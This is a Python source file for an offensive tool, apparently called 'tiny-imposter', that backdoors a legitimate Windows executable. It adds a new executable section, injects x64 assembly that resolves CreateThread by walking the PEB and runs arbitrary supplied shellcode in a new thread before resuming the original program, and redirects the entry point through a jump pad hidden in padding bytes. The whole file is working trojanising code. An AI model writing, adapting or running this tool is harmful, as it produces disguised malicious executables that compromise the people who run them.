import pefile
import sys
from keystone import Ks, KS_ARCH_X86, KS_MODE_64
import struct



def compile_asm(x64code):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, count = ks.asm(x64code)
    sh = b''
    for e in encoding:
        sh += struct.pack("B", e)
    sh = bytearray(sh)
    return sh


def align(size, align, address):
    if size % align == 0:
        return address + size
    
    return address + (size // align + 1) * align


def add_section(fileName, totalSize, sectionName):
    
    pe = pefile.PE(fileName)
    
    totalSizeAligned = align(totalSize, pe.OPTIONAL_HEADER.SectionAlignment, 0)

    section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__, pe=pe)
    section.__unpack__(bytearray(totalSizeAligned))
    section.Name = sectionName
    section.Characteristics = 0x60500060 # same as mingw gives .text sections

    section.set_file_offset(pe.sections[-1].get_file_offset() + pe.sections[-1].sizeof())
    section.Misc_VirtualSize = totalSizeAligned
    section.VirtualAddress = align(
        pe.sections[-1].Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment, pe.sections[-1].VirtualAddress
    )
    section.SizeOfRawData = totalSizeAligned
    section.PointerToRawData = align(pe.sections[-1].SizeOfRawData, pe.OPTIONAL_HEADER.FileAlignment, pe.sections[-1].PointerToRawData)

    pe.OPTIONAL_HEADER.SizeOfImage += totalSizeAligned
    pe.FILE_HEADER.NumberOfSections += 1

    pe.sections.append(section)
    pe.__structures__.append(section)

    pe.write(fileName)
    pe.close()


def insert_code(fileName, preparedShellcode):
    
    pe = pefile.PE(fileName)
    addedSection = pe.sections[-1]

    for i in range(len(preparedShellcode)):
        addedSection.pe.__data__[addedSection.PointerToRawData + i] = preparedShellcode[i]


    for i in range(addedSection.SizeOfRawData - len(preparedShellcode)):
        addedSection.pe.__data__[addedSection.PointerToRawData + i + len(preparedShellcode)] = 0


    pe.OPTIONAL_HEADER.AddressOfEntryPoint = addedSection.VirtualAddress
    pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()
    pe.write(fileName)
    pe.close()


def wrap_shellcode(fileName, inputShellcode):
    pe = pefile.PE(fileName)
    addedSection = pe.sections[-1]

    relEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint - (addedSection.VirtualAddress))
    pe.close()

    # Mostly stolen from the great boku: https://www.exploit-db.com/exploits/49819
    # Walks PEB => Finds kernel32 => Finds CreateThread => Calls CreateThread(0,0,shellcode,0,0,0) => Jumps to original entry point.
    # Resolving compares strings of lenght 8 to CreateTh because you can't tell me what to do.
    assemblyCode = f"""

    start:
        xor rdi, rdi
        xor rax, rax
        xor rdx, rdx

        mov rbx, gs:[rax + 0x60]
        mov rbx, [rbx + 0x18]
        mov rbx, [rbx + 0x20]
        mov rbx, [rbx]
        mov rbx, [rbx]
        mov rbx, [rbx + 0x20]
        mov r8, rbx

        mov ebx, [rbx + 0x3c]
        add rbx, r8
        mov edx, [rbx + 0x88]
        add rdx, r8

        xor r10, r10
        mov r10d, [rdx + 0x1c]
        add r10, r8

        xor r11, r11
        mov r11d, [rdx + 0x20]
        add r11, r8

        xor r12, r12
        mov r12d, [rdx + 0x24]
        add r12, r8

        jmp cont


    get_api:
        pop rbx
        pop rcx
        xor rax, rax
        mov rdx, rsp
        push rcx

    loop:
        mov rcx, [rsp]
        xor rdi, rdi
        mov edi, [r11 + rax * 4]
        add rdi, r8
        mov rsi, rdx

        repe cmpsb
        je resolve
    
    incloop:
        inc rax
        jmp loop

    resolve:
        pop rcx
        mov ax, [r12 + rax * 2]
        mov eax, [r10 + rax * 4]
        add rax, r8
        push rbx
        ret

    cont:
        mov rcx, 0x8
        mov rax, 0x6854657461657243
        push rax
        push rcx

        call get_api
        mov r14, rax

        push 0
        push 0
        sub rsp, 0x20

        mov r9, 0
        mov rcx, 0
        mov rdx, 0
        lea r8, [rip + shellcode]
        call r14

    jmpentry:
        jmp {hex(relEntryPoint)}
    shellcode:
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    """        

    return compile_asm(assemblyCode) + inputShellcode


def insert_jmp_pad(fileName):
    pe = pefile.PE(fileName)

    textsection = pe.sections[0]
    textbytes = textsection.get_data()

    most_consecs = 0
    most_consecs_start = 0

    start = 0
    consecs = 0
    last = textbytes[0]
    bytecount = len(textbytes)
    for i in range(1, len(textbytes)):
        current = textbytes[i]

        if last != 0 and current == 0:
            start = i
            consecs = 1
            last = current
            continue

        if current == 0 and last == 0:
            consecs += 1
            last = current
            continue

        if current != 0:

            if consecs > most_consecs:
                most_consecs = consecs
                most_consecs_start = start

            consecs = 0
            last = current


    if consecs > most_consecs:
        most_consecs = consecs
        most_consecs_start = start
        

    jmp_destination = pe.sections[-1].VirtualAddress - most_consecs_start - textsection.VirtualAddress - 0x6
    code = f"""
        lea rax, [rip]
        add rax, {hex(jmp_destination)}
        jmp rax    
    """
    compiledASM = compile_asm(code)

    if most_consecs < len(compiledASM):
        print("!!! Not enough room for jump pad.")
        pe.close()
        return


    for i in range(len(compiledASM)):
        textsection.pe.__data__[textsection.PointerToRawData + most_consecs_start + i] = compiledASM[i]

    pe.OPTIONAL_HEADER.AddressOfEntryPoint = textsection.VirtualAddress + most_consecs_start

    pe.write(fileName)
    pe.close()


def main():

    if len(sys.argv) != 3:
        print("NOT ENOUGH ARGUMENTS")
        print("Usage: python3 tiny-imposter.py legit.exe shellcode.bin")
        sys.exit(1)


    fileName = sys.argv[1]
    shellcodeFile = sys.argv[2]
    outFileName = f"sus_{fileName}"
    pe = pefile.PE(fileName)

    with open(fileName, 'rb') as f1: # zoom zoom
        with open(outFileName, 'wb') as f2:
            f2.write(f1.read())


    with open(shellcodeFile, 'rb') as f:
        myShellcode = f.read()


    add_section(outFileName, len(myShellcode) + 220, b'.sus')
    wrappedShellcode = wrap_shellcode(outFileName, myShellcode)
    insert_code(outFileName, wrappedShellcode)

    insert_jmp_pad(outFileName)


if __name__ == '__main__':
    main()
